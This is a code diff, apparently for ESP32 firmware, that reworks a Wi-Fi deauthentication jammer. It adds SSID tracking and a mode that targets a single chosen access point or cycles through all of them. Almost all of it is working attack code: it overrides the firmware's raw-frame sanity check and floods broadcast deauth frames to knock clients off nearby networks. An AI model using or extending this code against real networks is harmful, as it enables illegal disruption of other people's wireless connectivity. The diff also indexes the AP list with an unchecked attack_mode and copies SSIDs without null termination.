@@ -2,14 +2,13 @@
 
 struct APInfo {
     uint8_t bssid[6];
+    uint8_t ssid[33];
     int channel;
 };
 
-std::vector<APInfo> apList;
-std::vector<int> targetChannels;
-unsigned long last_channel_change = 0;
-const unsigned long channel_interval = 100;
-int channelIndex = 0;
+std::vector<APInfo> ap_list;
+std::vector<int> target_channels;
+unsigned int ap_index = 0;
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337) { return 1; }
@@ -48,16 +47,18 @@ void WiFi::performScan() {
     wifi_ap_record_t* apRecords = new wifi_ap_record_t[apCount];
     esp_wifi_scan_get_ap_records(&apCount, apRecords);
 
-    apList.clear();
+    ap_list.clear();
     std::set<int> uniqueChannels;
     for (int i = 0; i < apCount; i++) {
         APInfo ap;
         memcpy(ap.bssid, apRecords[i].bssid, 6);
         ap.channel = apRecords[i].primary;
-        apList.push_back(ap);
+        memcpy(ap.ssid, apRecords[i].ssid, 32);
+        ap_list.push_back(ap);
         uniqueChannels.insert(ap.channel);
     }
-    targetChannels.assign(uniqueChannels.begin(), uniqueChannels.end());
+    target_channels.assign(uniqueChannels.begin(), uniqueChannels.end());
+    ap_index = 0;
 
     delete[] apRecords;
     stopJamming();
@@ -90,30 +91,35 @@ void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
     esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
 }
 
-void WiFi::executeJamming() {
-    if (targetChannels.empty()) return;
+void WiFi::executeJamming(int attack_mode) {
+    if (target_channels.empty()) {
+        Serial.println("No channels to jam.");
+        return;
+    }
 
-    if (millis() - last_channel_change > channel_interval) {
-        channelIndex = (channelIndex + 1) % targetChannels.size();
-        int currentChannel = targetChannels[channelIndex];
-        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-        last_channel_change = millis();
+    if (attack_mode > -1) { ap_index = attack_mode; }
 
-        // Broadcast MAC address
-        uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t* currentBSSID = ap_list[ap_index].bssid;
+    int currentChannel = ap_list[ap_index].channel;
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    for (int i = 0; i < 10; i++) {
+        sendDeauthPacket(currentBSSID, broadcastMac);
+        delay(1);
+    }
 
-        for (const auto& ap : apList) {
-            if (ap.channel == currentChannel) {
-                // Send multiple deauth frames for effectiveness
-                for (int i = 0; i < 5; i++) {
-                    sendDeauthPacket(ap.bssid, broadcastMac);
-                    delay(1);
-                }
-            }
-        }
+    if (attack_mode == -1) {
+        ap_index = (ap_index + 1) % ap_list.size();
     }
 }
 
-int WiFi::findedAPs() {
-    return apList.size();
+int WiFi::foundAPs() {
+    return ap_list.size();
+}
+
+char* WiFi::getSSID(int index) {
+    if (index < 0 || index >= ap_list.size()) {
+        return nullptr;
+    }
+    return (char*)ap_list[index].ssid;
 }
